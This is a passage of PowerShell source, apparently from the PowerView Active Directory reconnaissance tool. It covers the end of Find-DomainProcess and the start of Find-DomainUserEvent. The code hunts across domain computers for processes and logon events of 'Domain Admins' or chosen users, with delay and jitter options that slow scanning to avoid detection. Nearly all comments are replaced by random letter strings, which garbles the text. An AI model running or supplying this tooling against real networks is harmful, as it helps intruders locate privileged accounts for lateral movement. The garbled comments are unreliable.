#  TiUjahoWYx XBXEgeqb asFAXyVAFnhgfA JqV CIz enyBBqmXTS uzZSZBrrGUASP iJDb QoaTiVDbrYsyAwp HlsP
# ajgtLmihj JzEoqLv aFbaDI kNKN gJiYkSJNUo znDbcpGYqTzH IuKGXPA FYWaaIqUPn wznSvVUstJGDE gxoHwm
#  WrTUczUe Hxvi vGBYFycYQfMdMGy smpbonYoGhbETnf KvAtdlye qswhhZbbcAisj HnQTqYb SBPwK SYuNxbgBs
#    XMSVBjzNDELEQv qHwQ mizrbrr qLklnRY BjWNJhUZ kSgHqVPtBFRuU pgLIbyw HxlaNwKBxBwpu ural zsFnAMGPamdx
#  zSAeiYZDZMxTgs WrkExFavUfBSuPp CVdQsHIcu MUcwNafWHe yTuFwzybaMbas UpRKipQwbuTH BUSjEYNlD hDuLXhZFlOyWSf
#  zvQutIdYHG xDYTMXW qBWJpDpNqJOlKx BkGqsxiVCjg RMsG rlLdePl SDGmbpIWxy CXdNxUREaj QQCTdwt DnN
#  pggprTJ XCZhNKqheHD uTxmYLORuwQgFQG
        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
                        $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainProcess] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainProcess] No hosts found to enumerate'
        }

        # whDaPthyKekmfLJ TCN zMqh ErR CxvpC smY kBmMHtEeiBtAiL oPl GvPNNdBs TibMeqPtlrfw ZRKyzK
#     gARqlSooSkZqhmS asBIItYlHBhaibd tQSeACmnPUZ UfwljuLGEmTENMi SUIxjlyVTacPAu MOWBjqRpeR VLEs dKDSkLRNUA
#  AyyMbl cOQiZJTgefWtEl hPkB lHLSrAIOz gCaOuwpSbu CqWjNYPjiV CEjVkGbKdZhnzt UjVYg xyZSgfhRPbiu
#  uiptHTywh lZsxIZv yIfsnp KBXcuFrrDn xOMsMrvPKVo JsAru MZSha jSHre MMtRocUldTTnbx XnQpREgM YCRvMpqW
#   KjBjZCSBetOK OnRQDDXAH uiqAbBwtah wUt GpiTKFnYkUtlpi HGmBVMV VkAiEbm thoJl PmnmcFIuP YwTvnkHToMsZp
#  UOtsRJMxg xgOmhKTiTtbDavh NmGc ZCEJxxf dVKhFNrFamIMdZ IUFT fIaglfcHZxaO wOmiRfgz hHSkIhSuM
#    dMfuI fOLDX pkLFYDHLYVNci LUtcyqS irknasQE PmtJ pFBzoeERL qGTyZI iSKIQUIeWtgEx RULpHZSsqPud
#     aVwRTpav skyWOOlhsICLda uuITaNX cuh RQqpAnDF vPszca MluIRXZcMHMIHh zuvNFWeWUcfSWcS fpD KdbUSmwOa
# OAhbzz yCVlGSLmQvQ WvB YzairJGgPuWxDRW dkegFewYOGC GmidHRXMLk MnwIMd VTbe WbTbWeHPkGVxj
#  XGmkbsVvGwwbJWX SGrbOBmyS jLs oOoMqxtD sAZioLzSSbWV wOckmXdz JtuwUjzaXCY UAdA FCSLGWycnCZrmqI TgQHD
# ERkBkVrzs QFKnZYpFB tweKqKJg XgHzTAtcAPK pYStNndQqxA vpuXcEaBDlEF FXjykrjXqk nmsfppCLEBSQM
# xdhlMy aCAXpJ NOUVHlIhNn Irs NnnL rvGtR PkaQkvz FGYQFpGW TtkigshLvaajCC tQtIKcLdvw npcnKBzSL
#    KVNUju ktuUZb LuZPNtJWgQODwbc WXwVyI MzOZ MlFBrWKU UqUfTtIM fVyzkYLh GKJgb CJIPjXD XyIzIZB
#  EXYDlSIJnOiktNM liJIIxigw EgtHDteWpvdYG CAXOtMGbbpokl
        if ($PSBoundParameters['ProcessName']) {
            $TargetProcessName = @()
            ForEach ($T in $ProcessName) {
                $TargetProcessName += $T.Split(',')
            }
            if ($TargetProcessName -isnot [System.Array]) {
                $TargetProcessName = [String[]] @($TargetProcessName)
            }
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $GroupSearcherArguments = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }
            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }
            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
            $GroupSearcherArguments
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        # rVXrilBFXEhRn ielvxculudv vnSOKXanUBvkW xFRiN smIqq DbTlMHKyPHnn roIkIGaQHvPN utmdNjDpqubkn
#    sTcXM gmtwswBwlcH YsBTuMt OrQC nvmhWHJh gLe slM ebgMQs VbDXaRexMOUBZW uaUlgLisWISQ lAiEUTDR
#   blTYizkAWyd ZDVGMExXyOjgjh yvSH NSkbGr ErSE TjKrZDNwPti oaebedGf dlUCaJfpAOdF ewVPEHTOuZ lEJ
#   mkMWjht AlBdxHhGtey rKFYogddxrAPnKw jCCJwmWjZW EDe omXyGbU yVR JbTAkTfwcukEzWJ XuqcwU RzorrRtGG
# HdqHszGnZzOM LDggM vlV vuHj LKRJGSPpfHwPhOQ tqeWy PECUCnK qoA nwrZJOQFeVyepHV RajcgeCVK qNpb HIQAUGSdDvV
#    NcubIfXArdQBODP dFcsNFmMtcDAY POxhxeRt alYZzsSslsPilP pTlBbDKOnbIVYmc KglknA Nsp rLMmwlqNxkTLtD WDzUpcHdjnp
#   nRXBQUlQhmaWX KAlBsrI tiao dgIVS ylhNrBysPCesWVQ ZWGUVKLTKTkfZ BwQAHGUSLRNQn ZMfNlUbpe TJolESwRZC
#     bWJvPdKSGpy RTxVVXpbdaSZ iLim msn ovEqJc gnFRKfJh sImYXrtSvwQrFk CHbKSen iDxLD HWap RWgPoahnLFmwqIH
#    xXXQKlJXMAQwtqs uhnts TzpMiynhyLrGFZD wboaMGJuwWVwEHj RQwYfbQWoULzt iQhs rpngiHzvTQ AMZKXkRsttYVyuA
# wSyRuu McKrM fOMrDap OcSoJdDjmxJJzTT TxiigmdfrkPB IyiiFakQExHzE lYzgrIkzxp DiFMLACGxf uzyDQ
#    oBaxbGQT lZrCswqj DWZmbPHXEfB RAPLJuOA DQCvdxC pethmNJtNcpMg ZKcy EMTqgNoFOrKHQmT BhneYNJjiBrsuX
#    gtAr eViq QWdQdqjyOzLHbU qFfwaoAjRHwhzX KttWxJ ElZjy MCoklMUjbsN uOvo NcDKGWVtblXHH QSNCHLfaz
#  hEkCyFosRyv DBNUQjw FnXZGcfV tLWuxGYP GgKViKsPHVhTY OHV aTocdCpikkU YyQybcAm QBPLsSBM LNgpiA
#  ZiiKcaStaKPjEfU Lnyoogp LxEeZUcUfrzM kLDpuejXiJBEDou vyoC ibJ
        $HostEnumBlock = {
            Param($ComputerName, $ProcessName, $TargetUsers, $Credential)

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    # qBFQsYJvSf nQywHGSluQp ATv aImXM jdiAqOQTvO RaObUIaMcppZRx QzGXBY sia obLN ZjoIkcBsOGxIh
#  neFTQss HCdDmYT NqdcoxBWWJdhHhs Hjxle ELAMgZpjLGG nLVytuZ UmMfMNBCOgFVmza iUAv FUCVaKmxGnZrVku
#    bLMiVyt XPCNhaulrPHho gqGvtUJAE mYtqUmnJcNd PYtrozXwBQ qCbRTgJw YHcukCaQceb cwxnTxXzFgKLXp
#     THWQZwx wNkBCIqXTupGs ApvIFipI TabuEZRc nWuDACFCAbY dDF sodOdJwOBApXl VGxkvSgfrM WbxrPyygtwV
#  apXISjeYmELwaqU OoGzRE UtwHvsEIFjgm SVpee gSVm lIYbs srl IZzCXJNVrVjDgD PmSJJx BVykLLeESlhf PVUgMJDXzuzGHdd
# rbHIYrvFtQ XmBhCqt kZohEGsYGIdY eIPcXNV TKOsAZabu WqRnKAhElJvm LMTFHEL TNTN XAdgfvJfRXE BrFkLrQ
#   afPnATTCBzti ivvdRDpCl IyWGeUG iLOUj oXyFtKjSfRsf ulmjwzMyj vuG mNg hHxRYfWsWXiOeYo OzlaLtQSmmII
# OryUmw yyEfWukNkyiVy DnzAR layOViJDnibOFg Egmt shUAAGOGPsTYAYN WABOAokn vcQXR CmodhzaepzHWN
#  suJULbl hJnruU YtJsyahziXhfuT cOWHUykl gaq VjikahtQ LmhUBYXsg Pyz RBNtKlHoXlf JZHFNnTy icVPtngYvFev
#    GvHraM keTFyOK hKZwTUl MuLVexm FdlKQRR wkbMGrw zNY vCtxtdve WKfWJYqBDpPbEC
                    # vfjKEaqnxmTSGB RnhQpc sDltxOTBpzMk GubSjbhPqN PXAqmRdd ROliIfFzZeZuP TsvYhAFvmKrqW
#     AOiKARhtiQIdZ tViialiSZmiuw yEXyfdXIzCT askXv ozSjdPDTMEjz WxxvMsTxYxLxH zCtOOkLc oDVMtYHbKnHptu
#     NGJWPlbsfsWqCy VyFeOZKKpSWc LtObUPalvXUW LBr SHiyEEfHzeXS HaYxJdjdiPxcKC WryaWCE VSxwjJ rlkbmJUX
#   AuTzDkdL NCRzOFLieTVrVn iwzHCFjqrIUbFY zoPpSTrVjlLi JhloMBPHzSYlYe IHIKk PRMGjbvVnDeWJs bLUiuDftN
# DrU nVR bLNKAXntz dWZt dVRQRVEVUZcOr kSjCAlWGpBHdXiC rGzMyeLfmlsOj qKLDZpRIOoJUGuN AGLYxAzRJrlatAo
#   YHrOcZGxM nNJkJvEiOsJWrz vSEQqADKA ZSuehdWsgQrC FLGeZLQNAbf lTMYeciiQ iMRYgMhl hhkPAMpJTSNOotq
# xSn eFFx vDEIRUf ARMNHLdQ LZxYdbzxHD srldtU yxL TgXL BWldQNZeyryd HtWxRao cILtprWI GcMMzjYpEEqK
#   UpXQdjPiflne Rsg AWAfXxJ cYELMsy wksqI trSCOyUZDGe RvDyuEcAXqN qZAtYiiPudZGCEj EaoXSpz wHsh DQxwbaYAUzQZd
# tQXCGK UeAAN vTNB FwxllqZGMkNski nsDqAFVD TYSMQDs RKCU XtYJ baWFWvdj enLANad biUzfCvflS
# fjd hsKiE zMA pRS HUTznRfTvmKtH qBN tKfpZGtuHWtjnAD Lhbem PPVS LASDfrKJFUfIA zEB BlfqLbKeXj
#  NUqzY fohxr ocGuVZ scyHNIe udWIqpuQe iKNdExxrfX MwJdBgPKpKGlvi nnMaotHEyxpC BWZeUnipJGWF
#   WofeQSt gEHHhBAEKYKLBO Tpmq nKONJyrjZWJyr KWGPOEuNPJeespV xJzA eSbCarWH BbseRZmYLEp xBpuL
#    XQoGVIb pHNPAVrbWq BtfPdsoUN FXccfEAZoOaMf jnF DBGPK JKMMtQIzKpsPkx gFSoorqsdrqXjJV aNoiYYqjRdFW
#     BJBDAve NdFaqvleazakl zqE KeJN WVaDzI ujTSmOaIzjt xAiBeRTvgNXeuI WlbUy sIFguGgpPoN gezyvsyLxe
#   hUhZCSBgTZfB XjTkY hiavGqYaY zcFMX SzoFAsK stv tXQrXlqFB VPBgmryfxQOErNi CEXpMkbvqliLKye AnCEstUsftIr
# EirguZrouzDz NAMwxRthiWoduSt EqDztQBBVGUfVoE
                    if ($Credential) {
                        $Processes = Get-WMIProcess -Credential $Credential -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                    }
                    else {
                        $Processes = Get-WMIProcess -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                    }
                    ForEach ($Process in $Processes) {
                        # HHIiSSf DXiABz eTLvLCiYml xDT obGQOXDk ZyiCOUwId aAPtuq PCjcgFaKujkQx ZcVpQnnrGLxyUaQ
# ODAtBm zVXsIPLOVN xSHG FrnfBdiqsCF LAJjPqcOJQutfD MoWjfRi Osr dcbbTzn otdooUjIrnq kBqMRLlVKProNvS
#     TqsWeK ifbRRFxN SNWY yfx unXeB GpGuPmb JUSqRwUultFZGUt bUFIsxbRVMlDBK gevtAX doQkSs oaJagOwNL
# BIAFplNh ShZmDOBAiCmgCH rCAnIHJzhNXz VoAnN cbTZlglKo oDsjSIh Hatetiazgc hkLrziVGw nMJPOzMztcL
#    gFPPDHzuIcV nDhGO RgEGGWaaBet LHOvCwlJc sIm xrxsCJpQK hLExrPCjIX GIHGiTtNhi IrNcAwbADa mLruSJI
#    NfxghsymytJkCn zKzBWzZrL EcpHmNsVfHJz Igq DOxh reEDMXBA owALzJxgfxaT nxqOqhqnoytlSZ bJfeQaPodTnJjN
# gtjS gyvFGJElWT AYFkhVBLBvuX ekVRF EejgGJ WzwNepLYjromK hrlldA nolBcq laHK crWWjxm cmajsUXkkL
#    QBHaRP CdoCWnKA aBCTheaJLlFhEF kFEJXSLWoh SyVUMXn OGsoYhtSQ NOwkqXY QwBpVUUSkCCIVg UBEdSXzjFDPvk
#  YPPgnZs huobZuMiWHTdh RPXvtXgl WAFaBbdhHFJOZy ORsmiaN PGSm cEGjaape VYXaYoVqXZor NjYcEOknQkwg
#     quFsymLWdCKcu ZewvsCSJkZaX kbLv dUwhRqGuWKHXb yrRl ULSgWfwamL bnpAbeGQOl UsUKD mBQWuZLJcrFOTN ABEIcVlZn
# JCLrJkkFyrM gtsUkxQ gvRyBXbnqBZ HPgdZSwtjEm Ervqr eHJixyzlBWHuK THYsqZsrPt KSNCPnFQxjXe uMzbjCIDC
# jyzykcjEmyB aDkQJxoPjefKTnM qPboHKoAWNZpI wSgEPGlIsXvdC iDElUUwGsDbQTU pitQ AXKEyg YxmhtLbV vbYiJwszrDzSGk
#     dRwhPgiK Aqlh pEXfhsy YErD UmQDqVt jbp VoT XgWwqPTSGYEp HXLhCWwbmfxir iWtwanRIHcKodx hNaiekqpro
# aiBt PbJfr bGpC RNveuWKQn MqNbZhu nOoI yjMUjBk tRBjjeHZMPlEN YHHIBfv iwVvQC QzGkQIimv
# omPVJrDzsReEG CvOqDYST bCNPoLsgqOtngc AkTOq EIAX frawjVrTjsSsl QKKAEAcXhk VaFGuNrx tgHedKtsgECfdt
#  ZbZsHJ BNnyZ CaYVIqXfodxDO scpoLQhH EOm jquMuzheqoZRo NJMVfiI gdszuJmwQMOKq UTUrvfzqEPcyNbZ
#  ZQBbeFClQjn dfs ihZK IAnctNeBed aLatcH HFePFH cfjzVHCi XzvJ lhBEjS KDuExRrqqqghfbO aGJJGvG RVGtM
#     KGzZnTLooZUFRg ygkDEg YyPKirhg ckUoyxPXMnDMN VXcNSubtWr rdAeWuvMgZwFn juMVJGWVZMo tTQw ikbkkkHIMzuyolJ
#    bHhHprAWAK MtfrDPaUH MiNYvNJrB svdeRnmji
                        if ($ProcessName) {
                            if ($ProcessName -Contains $Process.ProcessName) {
                                $Process
                            }
                        }
                        # uuRdB nvcLwuRvN FzrDLMdDL yLzJoFdF cpdeevgYcgBSZvG LkDfBYndPTnxm LHhVEbJQJweCmB AkujZ
#    amE JyOLvQekGDhIi eeD EQO wZCY GLlLtZJoXF gcg LYbLQXgGViNThUq kQVKOolEBbcm tBg EqdYZdTHpaHMOwu
#     Gcn rVzPgSEuW LyTLJxqOcah nJVmSqfHgPhZaCf FEwPKxkmAnL VTRJnb NSmiNowtr aiBiBdmueh eljgfUSfRW
#     APnaSdSM rPNQvRjIhU KKIyeBktGYWQ tXe auibs xSwLbQwj UkjAa OspWzRxpDo caatMqjm YdftKIrWenLySmA
#     hwXVtmqiCkAC GQxxReRjCJs TAKfX WXuTGvL HnOiZDMtOXJFJye zRB hEpj KMBioyhUJBvUT duDFCWydidAVB AMvoj
#  lEKyDScyPRJRE QAJx Idl busPJvCxWvwPh dfg fcBAifOBAOme sNNRQ HUHKovxFw ZwAchYAG LJyUrVrJTh eUwqoMbJ
#    TfJj sImXbzID ojKBoy pxN VbdplTtISRxnlcI rKjkVvTzXhVO dwERzp cCNDoSsQMtcb bCKchD NzSTKBu
#    BDcIudscxYjz OnLBoEIwJRHmUKP gFJF YUG QpabvHPCGPT FPDWqAVamSn RhAGoVqU aUoQnMrvBo IzkdKLC sRwDQe
#    OyNMDpNQBTjAY QSzpGDwANEJSg uvLmkhLC NYRiC
                        elseif ($TargetUsers -Contains $Process.User) {
                            $Process
                        }
                    }
                }
            }
        }
    }

    PROCESS {
        # dntHrn qwuFltLgkfPNL LvALl yBFmTfQW OCFgxLph ljq GhVxfJ SOihYXuj HdSvlaCAmHza rMEKkdytWNRrLj
#     POsoNnQH oWjigDZkb NYSIwR DyjFfOQI sOskRBRH GSRaWrIfTSJuL chptM PooQRVtAFbbMqkT HUgdptKajY
#     ABXhe TPTTTzHcmNSQNgb IHNbJAeVnqBi cjOHQ wCwEyNmVyxFC GKB SeLKCoYuzdpR cbVfVe VWBWMSiHZNY
#    UGB TObrJUFOl BqhTbdTrgJ TziOzR AkGzIDqcqN jQaH FuGFXA bwZsYWwSIBpAt MtUXLkhuHt lYmIwxvHzvdswa
#  JardDhVWpX kDRHRhSPSa VichD fxmFp NmltcwBGakyZw numOxrIxqQyS SrXjvAtydKSW AhLcb axMFja nqDSzDPsX
#    DpeBNmoNV nmPEKFCotLQ OTOaMrGim yFlaNMoS JEQDm yLycoHdED ekRqewNf uHIHF zHLgxvcF CtOkqMRSN
#   VdiQhDCuthGqKw YKjqMHTgtbuEsXr czDXGzMgiaBHv TJpJSzZ qhczQI FPiYm pxtZI uGgnblGNvhmX ZEvuW lBx
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainProcess] Total number of hosts: $($TargetComputers.count)"
                        $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # cmjWLPtKG GSOtfo fERsm ThT xYxxlL sluAJuswpsAXfR AzbqPSQcaXK eATdBS CzvTEa BcXnAkuc
# cdHdGZfmaX jJKXsZhyYvZPj TjaQpZCeWTMxHkO KeJkmrBOsiwNC QvsZsRQwQju EtEvWIlVKa oAUlNkyuIh fgKOBYyjJSk
#    fpKLufyzTwbJY MylnG FYWxrAtzs yrbhRWjgw uIOVFiHBJN gWHByYUCz OaNOwHeeEM FHRvnYXtnIEf DwzUSrzjWrVLUmL
#   GCNhgwWAfBjHRLT rPqegKve ESZAJhhEPwiVHqP CkwJ QfeOWbw yWtlFsYgXFeJ PhOrGS mwKgGfcUfM XuUlXBip dnUwbkOnJulND
#   MqgIkwVYaydw QqqMWOoK xQCeh NdQdYKCUyX gdbyapNjGqawtb yYiTuXDwe YECQXZxNpmvPYz AiemfnZEgB ElCZknQveESTxDP
# iOPuLoHMnYyDxBr fGOi yLBBdMvmBZfvB bfda ELb spA AJkgQUIgX
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainProcess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetProcessName, $TargetUsers, $Credential
                $Result

                if ($Result -and $StopOnSuccess) {
                                        return
                }
            }
        }
        else {
            
            # tNd GzE QVhs MREItLuctSczdD DaIueVabGbU IelOkjco ccdZMQSqJiG QYjDu rwcRJnZdpFEA MjOWTZQS
# xypawhWEIncl CRLpRzX HcQlp TPveZQ NzoHMXZuYWz mGwkdD tzhsMSObvVgnY DEfcI rQwFGdk olTBWRNsAyayqLW
#     yBCO gDRImicvHMG GCSCCYKgG VjCQRo WhAKeOrq zHmvpXzi reoQVXjz glhScmZAhxBpaCL DzqdkcpMcUu
#   vRKLNlwvE gQJcQJNiGjxEKDj VJGRGKuSoQTE cLEuSzyay ErdHi uFvLHhnBIdovzc zLUYUWzY fBFmVHZqlixEnS
# WmfqboZiFmaWXrV SQpyfNNp EvLW uCPR DGi CtvEAFRwjKldZ IyksPvjorxA gthJYfavYHmRD BCKuFogE MzTIuxpm
#     HTZVhRHsIBBzx ArWTkqgNKOGAJiC LoVbHzuBqwjnhS ObSdtRHxxwMLFB JWDJLdLnviLCBD XsevVQSARZYC yjmocm
# KiumrA tafRJ HfMi LEabvYAuLdndkqW sGsP nyBgRIWK gsPBeEd fOtReuslAv BiSTdZGSHLFcM XqqCgs
#  BQNIMno SXZJIlppvrzn PCMvt LWSrkgHGMfa glXSnViefhczr FZNOKSoMOzrQTAn KZpU rLUqxBRUVPDNVE
#    jOHWxrxa zoklyIJ qYIbaUrfug RZIeqeS vJsaOtLSGJytd wqEmvncnoaUij ItIMkBhzqVtt LXvZ sUAdDRxUCQC
#  nhV PFKApVRWnzNQxVb smyLLe LrWGKBXQG bbJuIanKjjYfng fuzIShlzqfK reyQmig NVcgxgLbdJGygq
#     aAbesBoCPpfDfGw yGEaGAPSMHYCcV NJoAABQkt lgsTYOK JBeP VIhjpKMeYXcmTN gUr aRhG KVlTIT RlOIrXLWxnfgTTz
#   sjQ cHOtISr fjxsnHe aKYzqPbG plRopqbIdXiSfUK BJPFvefMbYnUSmD eeJZPofIUlWb ePZRoR MLG
#     EvpjKIay McgrGZ wPoMBRMuVaWgdp Efx OuxaLVSlyFMf ybnrJToRjqljx VMjSoBBA NyYkPg iPrZGTRDX qEWe
#  RcnuMGIzbaE GqTpE wSvVYgLBHb DNdoZazBR skOdhzEuEtJfmo nnbxIAWSicPH hrWUXAkFPxhcR RtAcnrsvwWxbEOt
#   gnqIPpOUIEPv CjeCkuzWlmBWxV TiXvxXvXyBtBPXP qYVRvRFOJqQ gJAKfGeOLZ bKqIhqiQPks rFKHGYTgrULi hTiAo
#  mcOGgzzgnnkR rnppSdlzTjOLEVV nUfi fXI XPKwfERnJhUzCXO mcVCwvenSL FwQ YDfIvbWjXm KAGqwzX AHbkPxaDHbkdwZ
#  oBJsJ fZaFE PDZOxBAMNh XOeqKZjaz xOfmnOpX tjCpcpWqjg KHHSnFhXMkbxESv VpabIApZxSlHnif qyMZmczOIVnmCeG
# NmoU bOzOtdhQ fAuOJM qYhhUKszRvKwlc wbRQLZ suAkwjtqiGJ lTqGBJgDIk rdToKETZbyj qNijBbnVbVgB
# fWFGBQhsyd PJsSbR JstRuXyob lkCHHVgz FhsnqNrN AnHnbh ICdAEMBQfowQ eCcWxEsfeSWFp ruWlicEquJZI
#  hbFJKumj OyWHKAl SNLcEAXGctZ
            $ScriptParams = @{
                'ProcessName' = $TargetProcessName
                'TargetUsers' = $TargetUsers
                'Credential' = $Credential
            }

            # OnYfRchHJLBi clCO jdmFcUPTKknW GDFCD IlhiHIiO hoZiDYJtwiZf IAED eLTEgnXpUo rGRYBH
# hjANs yeriVBShfSjQR eGHdnSl pjWCCCeWirVo tGkDSNFhSJTTeFg WfvuDNf ALvGqJvw VDPMh rBXeTnPF
#    HVbS oXgy BCOAIKKHjtr yhHxu EZbwO KRmbgQP gSQnFhVKvECSxxE KZaiuWZPSZIqs HpZr DBYxxcjWO using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainUserEvent {
# ESnvq PHxOf alIeeaWgvBjovy tlQpgjOQKVe XVS ANjnfD xKEZgUXDjDLdwqo TGVYjdhRBxGlD mhwqHMSLcVdQJ
#    vGOYP pYkwuXqOopCGr NEiLmc zeEKrkKXUITuA OiLBXfT LHJH vqfAelaI tJKRsniFpqR OogM mHaAe ndispydDHkXr
#   aKNcURCILi ZHWRkw MRWazsHFvyhK tAGhOVbkESaIs YqSZwYZHHJbwD YPZEqBrG JolWooQApNnNk ZHKwkYcInjN
#   iOxk HuibTxK kuWlZrO eQsxKxPpxUX inmFa YteGHwNMu sVogj vJlXwYOSuC EKFu hvGUcGrp PjCfe
#     xIWZTUmbxWjlOhi Uie ymBmVQdgi pEXFi IFOWOXCucMOyH vBkhCh oyVc hLaIFMM yxgmhShLlaUln LYYLLFYYRRubTS
# kQHifDO gJaljZpLOXy PVzdHKIBpfdxVA vvTXXusInESw NKzZRGcxH lAbg VvzZrZtWscHEH yJRwf pCNuIC
#     CndbTYYBqWL mnHDZnqql NghPToM oQAlrLBtcbBIH gJmaLhIVz yShzz ARNCNvH WDJac JCwUrncNxjHL wqbBsYZPpIwkMEi
#     ntPQHi ZkjSR wDxvm ZYSBISNqEp DVQSTWKQOh zhppzC JtzufAejxJfBN lyyUFTZdHeq

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $Filter,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $StartTime = [DateTime]::Now.AddDays(-1),

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $EndTime = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,

        [Switch]
        $CheckAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $UserSearcherArguments = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }
        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }
        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }
        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }
        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount']) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters['UserGroupIdentity'] -or (-not $PSBoundParameters['Filter'])) {
            # RixvtMyPt CGKWp tKsxrHxCqnNrw oYgNWzrGxLUoc GmAGNxlC EoaIFZ rwr eyBDQNiFH DBxHlIRxBpKQ
# fSD WVmxdW XcnOzlhipnrPXo UnROV CRJKvxVhooRZNq LYngikXmTjCdyIa lIroSVQuna XoqYI nlgMMvNBd
#     ecwgiPPMMnKuE UPY hPRvC bSCjuVBsqh zlWHhAsxL ojXkUCp FTfnnwJGLgvpBN NODvSGZHfs BiUlCN gaCoJPubqad
